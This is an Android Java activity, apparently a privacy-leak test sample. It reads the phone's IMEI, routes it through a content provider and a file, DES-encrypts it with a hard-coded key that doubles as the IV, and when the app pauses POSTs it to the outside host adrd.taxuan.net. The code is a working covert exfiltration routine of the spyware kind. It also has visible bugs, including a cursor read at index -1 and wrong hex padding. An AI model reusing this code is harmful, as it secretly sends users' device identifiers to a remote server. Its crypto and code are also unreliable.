package com.example.encryptedphonestate2url;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;

import javax.crypto.Cipher;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.DESKeySpec;
import javax.crypto.spec.IvParameterSpec;

import org.apache.http.HttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.impl.client.DefaultHttpClient;

import android.R;
import android.support.v4.app.Fragment;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.ViewGroup;
import android.os.Build;

public class MainActivity extends Activity
{
	private final static String LOG_TAG = MainActivity.class.getName(); 
	private final static String FILE_NAME = "output";
	private String mImei;
	@Override
	protected void onCreate(Bundle savedInstanceState)
	{
		super.onCreate(savedInstanceState);
		try
		{
			//setContentView(R.layout.activity_main);
			TelephonyManager tele = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
			mImei = tele.getDeviceId();
		}
		catch(Exception ex)
		{
			ex.printStackTrace();
		}
	}
	@Override
	protected void onResume()
	{
		super.onResume();
		try
		{	
			ContentResolver resolver = getContentResolver();
			Cursor result = resolver.query(Uri.parse("content://" + MyContentProvider.AUTHROITY), null, mImei, null, null);
			String imei = result.getString(-1);
			Log.i(LOG_TAG, "IMEI: " + imei);
			BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(openFileOutput(FILE_NAME, 0)));
			writer.write(imei);
		}
		catch(Exception ex)
		{
			Log.e(LOG_TAG, ex.toString());
		}
	}
	public static String toHexString(byte[] b) 
	{
        StringBuffer buffer = new StringBuffer();
        int v1;
        for(v1 = 0; v1 < b.length; ++v1) {
            String hexStr = Integer.toHexString(b[v1] & 255);
            if(hexStr.length() < 2) {
                hexStr += "0";
            }

            buffer.append(hexStr);
        }

        return buffer.toString();
    }
	public static String encrypt(String message, String key) throws Exception {
        Cipher cipher = Cipher.getInstance("DES/CBC/PKCS5Padding");
        cipher.init(1, SecretKeyFactory.getInstance("DES").generateSecret(new DESKeySpec(key.getBytes(
                "UTF-8"))), new IvParameterSpec(key.getBytes("UTF-8")));
        return toHexString(cipher.doFinal(message.getBytes("UTF-8")));
    }
	public void sendPost(String url)
		throws Exception
	{
		HttpResponse httpResponse;
        DefaultHttpClient httpClient = new DefaultHttpClient();
        HttpPost httpPost = new HttpPost(url);
        httpPost.addHeader("Accept", "application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5");
        httpPost.addHeader("Accept-Language", "zh-CN, en-US");
        httpPost.addHeader("Accept-Charset", "utf-8, iso-8859-1, utf-16, *;q=0.7");
        httpResponse = httpClient.execute(((HttpUriRequest)httpPost));
        System.out.println("Status code: " + httpResponse.getStatusLine().getStatusCode());        
	}
	private String getURL(String data) 
	{
		return "http://adrd.taxuan.net/index.aspx?im=" + data;
	}
	@Override
	protected void onPause()
	{
		try
		{
			BufferedReader reader = new BufferedReader(new InputStreamReader(openFileInput(FILE_NAME)));
			String data = encrypt(reader.readLine(), "Hello world");
			sendPost(getURL(data));
		}
		catch(Exception ex)
		{
			ex.printStackTrace();
		}
	}
}
